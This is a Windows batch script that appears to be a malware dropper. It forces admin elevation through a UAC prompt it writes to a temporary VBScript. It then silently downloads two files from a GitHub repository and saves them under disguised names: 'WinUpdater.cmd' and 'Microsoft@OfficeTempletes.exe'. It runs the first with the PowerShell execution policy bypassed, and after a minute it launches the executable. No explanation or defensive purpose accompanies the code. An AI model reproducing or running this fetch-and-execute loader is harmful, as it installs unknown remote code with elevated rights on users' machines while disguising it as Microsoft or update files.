@echo off
setlocal

:: Check for administrative privileges
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if not '%errorlevel%'=='0' (
    echo Requesting administrative privileges...
    goto UACPrompt
)
goto gotAdmin

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" restarted", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    cd /D "%~dp0" 2>nul

set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Bypass.cmd"
set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Microsoft@OfficeTempletes.exe"
set "PS1_FILE=%temp%\WinUpdater.cmd"
set "EXE_FILE=%temp%\Microsoft@OfficeTempletes.exe"

echo Downloading files...
powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'" 2>nul
powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'" 2>nul

echo Executing PowerShell script...
powershell -ExecutionPolicy Bypass -File "%PS1_FILE%" 2>nul

echo Waiting for 60 seconds...
timeout /t 60 /nobreak >nul

echo Launching executable...
start "" "%EXE_FILE%"

endlocal